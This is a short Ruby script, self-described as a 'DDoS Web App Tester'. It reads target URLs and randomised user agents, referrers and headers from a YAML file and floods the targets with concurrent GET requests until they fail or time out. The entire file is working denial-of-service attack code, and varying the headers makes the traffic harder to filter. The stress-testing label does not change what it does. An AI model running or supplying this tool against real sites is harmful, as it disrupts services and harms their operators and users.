require 'rubygems'
require 'typhoeus'
require 'yaml'
# DDoS Web App Tester
max_concurrency = 200 # default limit

class String
    def is_i?
       !!(self =~ /^[-+]?[0-9]+$/)
    end
end


if ARGV.length < 1 
  puts "You must specify a yaml file to load attack information from. See example.yaml."
  exit
end

if !File::exists?(ARGV[0])
	puts "File #{ARGV[0]} does not exist"
	exit
end

if (ARGV.length >= 2) && ARGV[1].is_i?
	max_concurrency = Integer(ARGV[1])
end

# Load data to test against
ddos_data = YAML::load(File.read(ARGV[0]))
@urls = ddos_data["urls"]
@user_agents = ddos_data["user_agents"]
@referers = ddos_data["referrers"]
@rand_headers = ddos_data["random_headers"]

def retrieve_request
	url = @urls[rand(@urls.length)]
	rh = @rand_headers[rand(@rand_headers.length)]
	request = Typhoeus::Request.new(url,
									:method => :get,  
									:headers => {
														'Keep-Alive' => "115",
														"Accept-Charset" => "ISO-8859-1,utf-8;q=0.7,*;q=0.7", 
														"Connection" => "keep-alive", 
														"Referer" => @referers[rand(@referers.length)], 
														"User-Agent" => @user_agents[rand(@user_agents.length)], 
														rh.split(":")[0] => rh.split(":")[1].strip!
												}, 
								    :disable_ssl_host_verification => true, 
								    :disable_ssl_peer_verification => true)

	request.on_complete do |response| 
		if !response.success? 
			@keepRunning = false
		elsif response.timed_out?
			@keepRunning = false
		end
	end 

	return request
end

# TODO: Need to add in POST functionality 
hydra = Typhoeus::Hydra.new(:max_concurrency => max_concurrency)

10.times do
	hydra.queue(retrieve_request)
end
hydra.disable_memoization
hydra.cache_setter do |request|
  # do nothing
end
hydra.cache_getter do |request|
  nil
end

hydra_thread = Thread.new(hydra) { | h | 
	h.run
}

@keepRunning = true # Flag to specify if we should sending requests
# Alright let's attack
while @keepRunning do
	request = retrieve_request
	hydra.queue(request)
end

hydra_thread.join











